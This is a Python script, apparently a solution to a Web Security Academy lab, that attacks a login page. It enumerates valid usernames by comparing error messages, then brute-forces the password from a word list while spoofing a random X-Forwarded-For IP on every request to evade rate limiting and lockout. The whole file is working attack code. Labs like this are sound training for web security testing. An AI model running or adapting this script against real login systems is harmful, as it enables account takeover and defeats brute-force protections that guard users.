import requests
from bs4 import BeautifulSoup
from random import randint

# Set the URL and necessary headers
url = 'https://0aca00c903bc2e6681c6e8b800f20040.web-security-academy.net/login'
cookies = {'session': '9yWY61V7SdSOSYZpV7TccHgp4sV7F4rn'}


# Generate different IP addresses to simulate different users
def random_ip_generator():
    return "{}.{}.{}.{}".format(randint(0, 255), randint(0, 255), randint(0, 255), randint(0, 255))


# Retrieve the word list
passwords = []
usernames = []
with open("passwords.txt", "r") as f:
    passwords = f.read().splitlines()
with open("usernames.txt", "r") as f:
    usernames = f.read().splitlines()


# fist we should find the username and map them to the error message,
# which we know there is a different error message based on a valid username
def find_invalid_response_based_on_usernames():
    username_to_invalid_responses_temp = set()
    for username in usernames:
        ip = random_ip_generator()
        data = {'username': username, 'password': '1234'}

        # Set up the headers with the modified "X-Forwarded-for" header
        headers = {
            'X-Forwarded-For': ip
        }

        # Submit the login request with the given password and IP
        response = requests.post(url, headers=headers, cookies=cookies, data=data)

        # Extract class with content that is different
        bs = BeautifulSoup(response.text, 'html.parser')
        invalid_response = bs.find(class_='is-warning')

        print((username, invalid_response.text))
        username_to_invalid_responses_temp.add((username, invalid_response.text))
    return username_to_invalid_responses_temp


# (username, response)
username_to_invalid_responses = find_invalid_response_based_on_usernames()


# search through the responses
# find the error message which has lower count of occurrence.
# return the username associated with that error message.
def find_distinct_response():
    distinct_responses = set(map(lambda x: x[1], username_to_invalid_responses))
    all_responses = list(map(lambda x: x[1], username_to_invalid_responses))
    founded_distinct_response = ("", 100000)

    for distinct_response in distinct_responses:
        count = all_responses.count(distinct_response)
        if count < founded_distinct_response[1]:
            founded_distinct_response = (distinct_response, count)

    return list(
        filter(
            lambda item: item[1] == founded_distinct_response[0],
            username_to_invalid_responses
        )
    )[0]


# get username
distinct_response_username = find_distinct_response()[0]
print(f"username which was distinct {distinct_response_username}")

# iterate over password with the valid username and find the pass word
for password in passwords:
    ip = random_ip_generator()
    data = {'username': distinct_response_username, 'password': password}

    # Set up the headers with the modified "X-Forwarded-for" header
    headers = {
        'X-Forwarded-For': ip
    }

    # Submit the login request with the given password and IP
    response = requests.post(url, headers=headers, cookies=cookies, data=data)

    if 'Invalid' in response.text:
        print(f'{distinct_response_username} {password} was not successfully logged in.')
    else:
        print(f'Login Successful with password: {password} and username: {distinct_response_username}')
        break
